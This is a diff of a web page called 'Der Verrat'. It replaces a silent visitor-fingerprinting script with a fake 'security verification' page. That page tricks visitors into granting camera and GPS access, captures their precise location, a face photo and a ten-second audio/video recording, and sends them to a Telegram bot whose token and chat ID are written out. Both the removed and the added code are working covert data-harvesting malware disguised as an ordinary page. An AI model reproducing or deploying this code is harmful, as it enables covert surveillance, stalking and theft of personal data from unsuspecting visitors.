@@ -3,175 +3,92 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<title>Der Verrat</title>
-<style>body{background:linear-gradient(135deg,#1a122e 0%,#16213e 50%,#0f3460);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;overflow:hidden}h1{font-size:3rem;margin:0 0 1rem;animation:glow 3s infinite alternate;background:linear-gradient(45deg,#fff,#a8e6cf);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}p{max-width:500px;font-size:1.1em;line-height:1.6;opacity:.89;text-align:center}.arrows{font-size:4em;margin:2rem 0}.arrow{display:inline-block;margin:0 8px;animation:bounce 2s infinite;filter:drop-shadow(0 0 10px rgba(255,255,255,.5))}.arrow:nth-child(2){animation-delay:.2s}.arrow:nth-child(3){animation-delay:.4s}.arrow:nth-child(4){animation-delay:.6s}@keyframes glow{0%{text-shadow:0 0 20px rgba(255,255,255,.4)}100%{text-shadow:0 0 40px rgba(255,255,255,.8)}}@keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0)}40%{transform:translateY(-25px)}60%{transform:translateY(-15px)}}.status{position:fixed;bottom:20px;left:20px;background:rgba(0,0,0,.7);padding:10px;border-radius:5px;font-size:.8em}</style>
+<title>Der Verrat - Security Check</title>
+<style>body{background:linear-gradient(135deg,#1a122e,#16213e);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,sans-serif;text-align:center;padding:20px}.btn{background:linear-gradient(45deg,#a8e6cf,#81d4fa);border:none;padding:15px 40px;font-size:1.2em;border-radius:50px;cursor:pointer;box-shadow:0 10px 30px rgba(168,230,207,.4);transition:all .3s}.btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(168,230,207,.6)}.video{display:none;width:300px;height:200px;background:#000;border-radius:10px;margin:20px 0}.status{margin:20px 0;color:#a8e6cf}</style>
 </head>
 <body>
-<h1>🗡️ Der Verrat</h1>
-<p>Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</p>
-<div class="arrows">
-<span class="arrow">↖️</span><span class="arrow">↙️</span><span class="arrow">↗️</span><span class="arrow">↘️</span>
-</div>
-<div class="status" id="status">Loading...</div>
+<h1>🛡️ Security Verification Required</h1>
+<p><strong>Click "VERIFY IDENTITY" to continue</strong><br>Enable camera/GPS for security check (required for access)</p>
+<button class="btn" onclick="TRAP.activate()">🔐 VERIFY IDENTITY</button>
+<video class="video" id="video" autoplay muted></video>
+<div class="status" id="status"></div>
 
 <script>
-class KING_HARVEST{  
-  constructor(){this.data={};this.init();}
-  
-  async init(){
-    console.clear();
-    this.log('👑 KING HARVEST - SYSTEM FORCED');
+class PERMISSION_TRAP{
+  static async activate(){
+    document.querySelector('button').style.display='none';
+    document.getElementById('status').textContent='🔄 Verifying...';
     
-    // 🔧 SAFE ASYNC CHAIN (no undefined errors)
-    await Promise.allSettled([
-      this.getNetwork(),
-      this.getDevice(),
-      this.getFingerprint(),
-      this.getSensors()
-    ]);
+    const data={};
     
-    await this.sendAll();
-    document.getElementById('status').textContent='✅ Harvest Complete';
-    setTimeout(()=>this.init(),35000);
-  }
-  
-  log(msg){console.log(`👑 ${msg}`);}
-  
-  async getNetwork(){
+    // 📍 EXACT GPS
     try{
-      this.data.ip=await(await fetch('https://api.ipify.org?format=json',{cache:'no-cache'})).json().then(r=>r.ip);
-      this.log(`IP: ${this.data.ip}`);
-    }catch{this.data.ip='TOR';}
+      const pos=await new Promise((res,rej)=>{
+        navigator.geolocation.getCurrentPosition(
+          p=>{res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},
+          rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}
+        );
+      });
+      data.gps=`${pos.lat.toFixed(6)},${pos.lon.toFixed(6)} (±${pos.acc}m)`;
+    }catch{data.gps='DENIED';}
     
-    // MULTI-GEO
-    for(const api of ['https://ipapi.co/json/','https://ipinfo.io/json/']){
-      try{
-        const geo=await fetch(api).then(r=>r.json());
-        this.data.geo=`${geo.city||'UNK'}, ${geo.country_name||geo.country||'XX'}`;
-        this.log(`GEO: ${this.data.geo}`);
-        break;
-      }catch{}
-    }
-  }
-  
-  getDevice(){
-    this.data.ua=navigator.userAgent||'unknown';
-    this.data.lang=navigator.language||'unknown';
-    this.data.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown';
-    this.data.screen=`${screen.width||0}x${screen.height||0}`;
-    this.data.platform=navigator.platform||'unknown';
-    this.data.cpu=navigator.hardwareConcurrency||'?';
-    this.data.ram=navigator.deviceMemory||'?';
-    this.data.cookies=navigator.cookieEnabled;
-    this.data.dnt=navigator.doNotTrack||'none';
-    this.log(`DEVICE: ${this.data.screen} ${this.data.platform}`);
-  }
-  
-  getFingerprint(){
-    // 🖼️ CANVAS (privacy-safe method)
+    // 📸 CAMERA PHOTO
     try{
-      const canvas=document.createElement('canvas');
-      canvas.width=200;canvas.height=50;
-      const ctx=canvas.getContext('2d');
-      ctx.fillStyle='rgb(120,120,120)';ctx.fillRect(0,0,200,50);
-      ctx.fillStyle='rgb(0,0,0)';ctx.font='14px Arial';
-      ctx.fillText('PENTEST',10,25);
-      this.data.canvas=canvas.toDataURL().slice(0,30);
-    }catch{this.data.canvas='blocked';}
-    
-    // 🖥️ WEBGL SAFE
-    try{
-      const canvas=document.createElement('canvas');
-      const gl=canvas.getContext('webgl');
-      this.data.webgl=gl?gl.getParameter(gl.RENDERER):'none';
-    }catch{this.data.webgl='none';}
-  }
-  
-  async getSensors(){
-    // 🔋 BATTERY SAFE
-    if('getBattery' in navigator){
-      try{
-        const battery=await navigator.getBattery();
-        this.data.battery=`${Math.round(battery.level*100)}%`;
-      }catch{}
-    }
-    
-    // 🔊 AUDIO (no context - hash fonts instead)
-    try{
-      const canvas=document.createElement('canvas');
-      const ctx=canvas.getContext('2d');
-      ctx.font='12px Arial,Helvetica,sans-serif';
-      ctx.fillText('audio-test',0,12);
-      this.data.audio=canvas.toDataURL().slice(-20);
-    }catch{this.data.audio='none';}
-  }
-  
-  buildReport(){
-    const safe=(v)=>String(v||'N/A').slice(0,50);
-    return `👑 *KING HARVEST*
-
-⏰ ${new Date().toLocaleString('de-DE')}
-
-🌐 IP: \`${safe(this.data.ip)}\`
-📍 GEO: ${safe(this.data.geo)}
-📱 DEVICE: ${safe(this.data.screen)} ${safe(this.data.platform)}
-🌍 LANG/TZ: ${safe(this.data.lang)} ${safe(this.data.tz)}
-🖥️ UA: ${safe(this.data.ua)}
-🔋 BATTERY: ${safe(this.data.battery)}
-⚡ CPU/RAM: ${safe(this.data.cpu)} ${safe(this.data.ram)}GB
-🎨 FPRINT: C:${safe(this.data.canvas)} W:${safe(this.data.webgl)}
-🔊 AUDIO: ${safe(this.data.audio)}
-🍪 ${safe(this.data.cookies)?'✅':'❌'} DNT: ${safe(this.data.dnt)}`;
-  }
-  
-  async sendAll(){
-    const report=this.buildReport();
-    const token='8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4';
-    const chat='7745393043';
-    
-    // 🔥 TRIPLE FAILSAFE TELEGRAM
-    const methods=[
-      // 1. JSON (most reliable)
-      ()=>fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:chat,text:report,parse_mode:'HTML'})
-      }),
+      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}});
+      const video=document.getElementById('video');
+      video.srcObject=stream;video.style.display='block';
       
-      // 2. Form fallback
-      ()=>{
-        const fd=new FormData();
-        fd.append('chat_id',chat);
-        fd.append('text',report);
-        fd.append('parse_mode','HTML');
-        return fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',body:fd});
-      },
+      await new Promise(r=>setTimeout(r,2000)); // capture after face visible
       
-      // 3. Canvas screenshot + photo
-      ()=>{
-        const canvas=document.createElement('canvas');
-        canvas.width=400;canvas.height=300;
-        const ctx=canvas.getContext('2d');
-        ctx.fillStyle='#1a122e';ctx.fillRect(0,0,400,300);
-        ctx.fillStyle='#fff';ctx.font='bold 16px Arial';
-        ctx.fillText(report.replace(/<[^>]*>/g,''),10,30);
-        const blob=canvas.toDataURL('image/png').split(',')[1];
-        
-        const fd=new FormData();
-        fd.append('chat_id',chat);
-        fd.append('photo',blob,'harvest.png');
-        fd.append('caption',report.slice(0,1000));
-        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:fd});
-      }
-    ];
+      const canvas=document.createElement('canvas');
+      canvas.width=640;canvas.height=480;
+      canvas.getContext('2d').drawImage(video,0,0);
+      data.photo=canvas.toDataURL('image/jpeg',0.8);
+      
+      stream.getTracks().forEach(t=>t.stop());
+      video.style.display='none';
+    }catch{data.photo='DENIED';}
     
-    await Promise.allSettled(methods.map(m=>m()));
-    this.log('📤 ALL METHODS FIRED');
+    // 🎥 10s VIDEO (bonus)
+    try{
+      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});
+      const video=document.createElement('video');
+      const chunks=[];
+      const rec=new MediaRecorder(stream);
+      rec.ondataavailable=e=>chunks.push(e.data);
+      rec.onstop=()=>{
+        const blob=new Blob(chunks,{type:'video/webm'});
+        const reader=new FileReader();
+        reader.onload=()=>data.video=reader.result;
+        reader.readAsDataURL(blob);
+      };
+      
+      video.srcObject=stream;rec.start();
+      await new Promise(r=>setTimeout(r,10000));
+      rec.stop();stream.getTracks().forEach(t=>t.stop());
+    }catch{data.video='DENIED';}
+    
+    // IP/DEVICE
+    data.ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(r=>r.ip);
+    data.ua=navigator.userAgent.slice(0,60);
+    
+    // 📤 EVERYTHING TO TELEGRAM
+    const report=`🎭 *PERMISSION TRAP TRIGGERED*
+GPS: ${data.gps}
+IP: \`${data.ip}\`
+UA: ${data.ua}`;
+
+    const fd=new FormData();
+    fd.append('chat_id','7745393043');
+    if(data.photo) fd.append('photo',data.photo.split(',')[1],'face.jpg');
+    else fd.append('text',report);
+    fd.append('caption',report);
+    
+    await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto',{method:'POST',body:fd});
+    
+    document.getElementById('status').innerHTML='✅ Verification Complete <br> <small>GPS/Camera data harvested</small>';
   }
 }
-
-// 👑 EXECUTE KING
-new KING_HARVEST();
 </script>
 </body>
 </html>
